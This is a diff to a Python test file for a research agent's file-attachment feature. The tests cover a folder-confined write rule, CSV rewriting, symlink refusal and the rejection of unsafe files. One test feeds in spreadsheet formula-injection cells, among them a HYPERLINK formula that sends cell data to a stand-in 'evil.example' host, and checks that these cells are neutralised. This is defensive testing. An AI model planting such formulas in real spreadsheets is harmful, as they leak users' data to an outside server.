@@ -8,7 +8,7 @@ import socket
 import time
 import unittest
 from datetime import timedelta
-from pathlib import Path, PureWindowsPath
+from pathlib import Path, PurePosixPath, PureWindowsPath
 from unittest import mock
 
 from inbox_support import REAL_RESOLVE_HOST, FakeUnio, HomeCase, inbox, write_fake_claude
@@ -461,7 +461,7 @@ class Run(HomeCase):
         self.assertEqual(self.once("research"), 0)
         session, = self.sessions()
         argv = session["argv"]
-        self.assertEqual(argv[argv.index("--tools") + 1], "WebSearch,WebFetch")
+        self.assertEqual(argv[argv.index("--tools") + 1], "WebSearch,WebFetch,Write")
         self.assertTrue(argv[argv.index("--append-system-prompt-file") + 1].endswith("researcher.md"))
         self.assertIn("Research limits:", session["prompt"])
         self.assertEqual(session["headers"], ["Authorization", "X-Unio-Inbox-Claim", "X-Unio-Inbox-Item"])
@@ -605,6 +605,28 @@ class Run(HomeCase):
         self.assertEqual(self.once("research"), 0)
         self.assertEqual(self.fake.seen("PUT", "/v1/comments/c-session-reply"), [])
         self.assertEqual(self.items()[0]["research"]["end"], "complete")
+
+    def test_a_file_reaches_the_answer(self):
+        self.assertEqual(self.once("research_file"), 0)
+        upload, = self.fake.seen("POST", "/v1/agents/inbox/files")
+        body = upload["body"]
+        self.assertEqual((body["key"], body["claimId"], body["commentId"], body["name"]),
+                         ("comment:c-0001", "claim-0001-fake", "c-session-reply", "dados-teste-2026.csv"))
+        self.assertNotIn("target", body)
+        self.assertTrue(body["content"].startswith("\ufeffmunicipio;aliquota;fonte\r\n"))
+        self.assertTrue(body["note"].startswith("Anexei dados-teste-2026.csv:"))
+        self.assertEqual(upload["headers"]["Idempotency-Key"],
+                         "unio-inbox:file:comment:c-0001:claim-0001-fake:dados-teste-2026.csv:comment")
+        self.assertNotIn("X-Unio-Inbox-Claim", upload["headers"])
+        done = self.fake.seen("POST", "/v1/agents/inbox/complete")[0]["body"]
+        self.assertEqual(done["usage"]["files"], 1)
+
+    def test_a_task_file_falls_back_to_the_answer(self):
+        self.fake.task_files_refused = True
+        self.assertEqual(self.once("research_file", mention("@[Agent](user_agent) pesquise e anexe na tarefa")), 0)
+        first, second = self.fake.seen("POST", "/v1/agents/inbox/files")
+        self.assertEqual((first["body"]["target"], "target" in second["body"]), ("task", False))
+        self.assertEqual(self.fake.seen("POST", "/v1/agents/inbox/complete")[0]["body"]["usage"]["files"], 1)
 
     def test_web_off_keeps_the_reply_run(self):
         os.environ["UNIO_INBOX_WEB"] = "off"
@@ -1012,3 +1034,124 @@ class Settlement(HomeCase):
         api.settle = lambda method, path, body, key, timeout=20: (keys.append(key), api.call(method, path, body))[1]
         r.settle(api, "complete", {"key": "k"}, {"claimId": "c"}, outcome="replied", note="n")
         self.assertEqual(keys, ["unio-inbox:complete:k:c", "unio-inbox:complete:k:c:plain"])
+
+
+class FilesProfile(HomeCase):
+    def test_write_is_confined_to_the_folder(self):
+        self.profile("org_test")
+        r = inbox.Runner(inbox.Config({**os.environ, "UNIO_INBOX_WEB": "on"}, "org_test"))
+        r.state.ensure()
+        argv = r.research_args(Path("/m.json"), ("WebSearch", "WebFetch"), Path("/state/runs/k/work/files-abcdefgh"))
+        self.assertEqual(argv[argv.index("--tools") + 1], "WebSearch,WebFetch,Write")
+        allowed = argv[argv.index("--allowedTools") + 1].split(",")
+        self.assertEqual(allowed[-1], inbox.files_rule(Path("/state/runs/k/work/files-abcdefgh")))
+
+    def test_the_rule_on_each_system(self):
+        self.assertEqual(inbox.files_rule(PurePosixPath("/home/u/state/work/files-abcdefgh"), windows=False),
+                         "Edit(//home/u/state/work/files-abcdefgh/**)")
+        self.assertEqual(inbox.files_rule(PureWindowsPath(r"C:\Users\U\AppData\Local\unio\work\files-abcdefgh"),
+                                          windows=True),
+                         "Edit(//c/Users/U/AppData/Local/unio/work/files-abcdefgh/**)")
+
+    def test_the_prompt_names_the_folder(self):
+        facts = {"web": ("WebSearch",), "minutes": 13, "turns": 60, "files": Path("/w/files-abcdefgh")}
+        text = inbox.build_prompt(mention(), [], 1, research=facts)
+        self.assertIn(f"Files: write only into {Path('/w/files-abcdefgh')}, and only when the \"Files\" rules", text)
+
+
+def csv_rows(n, sep=","):
+    return "\n".join([sep.join(["municipio", "aliquota", "fonte"])] +
+                     [sep.join([f"Cidade {i}", f'"{i % 5},0"' if sep == "," else f"{i % 5},0",
+                                f"https://www.gov.example/{i}"]) for i in range(n)]) + "\n"
+
+
+class FileChecks(HomeCase):
+    BODY = ("## Resposta\nA.\n\nAnexei **aliquotas-iss-2026.csv**: as 80 linhas com município e alíquota.\n\n"
+            "Anexei **relatorio-iss-2026.pdf**: o relatório completo para enviar ao cliente.")
+
+    def folder(self, files):
+        folder = self.tmp / "files-abcdefgh"
+        folder.mkdir()
+        for name, data in files.items():
+            (folder / name).write_bytes(data if isinstance(data, bytes) else data.encode("utf-8"))
+        return folder
+
+    def test_what_passes(self):
+        report = "# Relatório\n\n" + "\n".join(f"- Achado {i} com base na fonte oficial." for i in range(80))
+        kept, dropped = inbox.check_files(self.folder({"aliquotas-iss-2026.csv": csv_rows(80),
+                                                       "relatorio-iss-2026.md": report}), self.BODY)
+        self.assertEqual(dropped, [])
+        csv_file, pdf = sorted(kept, key=lambda f: f["name"])
+        self.assertTrue(csv_file["content"].startswith("﻿municipio;aliquota;fonte\r\n"))
+        self.assertIn("\r\nCidade 1;1,0;https://www.gov.example/1\r\n", csv_file["content"])
+        self.assertFalse(csv_file["render"])
+        self.assertEqual((pdf["shown"], pdf["render"]), ("relatorio-iss-2026.pdf", True))
+
+    def test_a_semicolon_csv_keeps_its_cells(self):
+        kept, _ = inbox.check_files(self.folder({"aliquotas-iss-2026.csv": csv_rows(80, ";")}), self.BODY)
+        self.assertIn("\r\nCidade 1;1,0;https://www.gov.example/1\r\n", kept[0]["content"])
+
+    def test_no_cell_runs_as_a_formula(self):
+        text = inbox.rewrite_csv('municipio,aliquota,fonte\nSP,2%,"=HYPERLINK(""https://evil.example/?d=""&A1)"\n'
+                                 'RJ,-5,@SUM(1+1)\nBH,+2.5%,"\tcmd"\nPOA,-1.234,5,+x\n')
+        rows = [line.split(";") for line in text.lstrip("\ufeff").split("\r\n") if line]
+        self.assertEqual(rows[1], ["SP", "2%", "\"'=HYPERLINK(\"\"https://evil.example/?d=\"\"&A1)\""])
+        self.assertEqual(rows[2], ["RJ", "-5", "'@SUM(1+1)"])
+        self.assertEqual(rows[3], ["BH", "+2.5%", "'\tcmd"])
+        self.assertEqual(rows[4], ["POA", "-1.234", "5", "'+x"])
+
+    def test_what_is_dropped(self):
+        big = "x" * (inbox.FILE_MAX_BYTES + 1)
+        files = {"aliquotas-iss-2026.csv": csv_rows(3), "Notas.md": "y" * 2000, "nao-citado-2026.md": "z\n" * 1000,
+                 "grande-2026.md": big, "relatorio-iss-2026.md": "# R\n\n<script>x</script>\n" + "w" * 2000,
+                 "dados.txt": "t" * 2000, "binario-2026.md": b"\xff\xfe" + b"a" * 2000}
+        folder = self.folder(files)
+        (folder / "pasta").mkdir()
+        body = self.BODY + " **grande-2026.md** **binario-2026.md** **Notas.md** **dados.txt**"
+        kept, dropped = inbox.check_files(folder, body)
+        self.assertEqual(kept, [])
+        self.assertEqual(dict(dropped), {"aliquotas-iss-2026.csv": "size", "Notas.md": "name",
+                                         "nao-citado-2026.md": "unnamed", "grande-2026.md": "size",
+                                         "relatorio-iss-2026.md": "markdown", "dados.txt": "name",
+                                         "binario-2026.md": "encoding", "pasta": "not_a_file"})
+
+    def test_a_file_that_repeats_the_comment(self):
+        lines = [f"- Achado {i} conferido." for i in range(100)]
+        body = "\n".join(lines) + "\n\nAnexei **resumo-2026.md**: o mesmo."
+        kept, dropped = inbox.check_files(self.folder({"resumo-2026.md": "\n".join(lines)}), body)
+        self.assertEqual(dropped, [("resumo-2026.md", "repeats_comment")])
+
+    @unittest.skipIf(os.name == "nt", "symlinks need privileges on Windows")
+    def test_a_link_is_never_followed(self):
+        outside = self.tmp / "segredo.md"
+        outside.write_text("s" * 2000, encoding="utf-8")
+        folder = self.folder({})
+        (folder / "segredo-2026.md").symlink_to(outside)
+        kept, dropped = inbox.check_files(folder, "**segredo-2026.md**")
+        self.assertEqual(dropped, [("segredo-2026.md", "not_a_file")])
+
+    def test_at_most_two_and_one_pdf(self):
+        report = "# R\n\n" + "\n".join(f"- Linha {i} do relatório." for i in range(100))
+        files = {f"r{i}-2026.md": report for i in range(3)}
+        body = "**r0-2026.pdf** **r1-2026.pdf** **r2-2026.md**"
+        kept, dropped = inbox.check_files(self.folder(files), body)
+        self.assertEqual([f["name"] for f in kept], ["r0-2026.md", "r2-2026.md"])
+        self.assertEqual(dropped, [("r1-2026.md", "second_pdf")])
+
+    def test_note_and_target(self):
+        self.assertEqual(inbox.file_note(self.BODY, "aliquotas-iss-2026.csv"),
+                         "Anexei aliquotas-iss-2026.csv: as 80 linhas com município e alíquota.")
+        self.assertEqual(len(inbox.file_note("Anexei **a-2026.md**: " + "x" * 400, "a-2026.md")), 200)
+        self.assertIsNone(inbox.file_note("**", "**"))
+        for text in ("pesquise e anexe na tarefa", "coloque no card a planilha", "Anexe a planilha na própria tarefa",
+                     "please attach it to the task", "@[Agent](u) research and put the CSV on the task",
+                     "suba o arquivo na tarefa", "salve na tarefa", "carregue a planilha no card",
+                     "não responda aqui: anexe na tarefa"):
+            self.assertTrue(inbox.wants_task_file(text), text)
+        for text in ("pesquise as alíquotas", "anexe a planilha", "attach the csv",
+                     "levante os subsídios jurídicos para a tarefa",
+                     "pesquise a substituição tributária aplicável na tarefa",
+                     "veja o prazo subsequente na tarefa", "address it to the task",
+                     "@[Bot](x) não anexe na tarefa, só responda", "pesquise e não coloque no card",
+                     "não precisa anexar na tarefa", "please don't put it on the task", "do not attach it to the task"):
+            self.assertFalse(inbox.wants_task_file(text), text)
